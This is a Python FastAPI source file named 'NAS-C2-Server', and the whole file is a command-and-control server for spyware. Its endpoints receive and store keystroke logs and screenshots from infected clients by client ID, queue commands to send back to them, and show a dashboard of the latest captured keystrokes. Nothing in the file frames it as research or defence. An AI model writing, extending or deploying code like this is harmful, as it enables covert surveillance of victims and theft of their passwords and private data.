from fastapi import FastAPI, Request, HTTPException
from pydantic import BaseModel
import logging
import os
from datetime import datetime
import json

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = FastAPI(title="NAS-C2-Server")

keylogs = {}
screenshots = {}
commands = {}

class LogEntry(BaseModel):
    client_id: str
    timestamp: str
    data: str

@app.get("/")
def read_root():
    return {
        "status": "online", 
        "clients": len(keylogs),
        "version": "1.0"
    }

@app.post("/api/log")
def receive_log(entry: LogEntry):
    if entry.client_id not in keylogs:
        keylogs[entry.client_id] = []
    
    log_entry = {
        "time": entry.timestamp,
        "data": entry.data
    }
    keylogs[entry.client_id].append(log_entry)
    
    logger.info(f"[{entry.client_id}] New Log: {entry.data[:50]}...")
    return {"status": "ok"}

@app.post("/api/screenshot")
def receive_screenshot(entry: LogEntry):
    if entry.client_id not in screenshots:
        screenshots[entry.client_id] = []
    
    screenshots[entry.client_id].append({
        "time": entry.timestamp,
        "data": entry.data
    })
    return {"status": "ok"}

@app.post("/api/command")
def send_command(entry: LogEntry):
    commands[entry.client_id] = entry.data
    return {"status": "command_sent"}

@app.get("/api/dashboard")
def get_dashboard():
    return {
        "total_clients": len(keylogs),
        "clients": list(keylogs.keys()),
        "latest_logs": {k: v[-1] if v else None for k, v in keylogs.items()}
    }
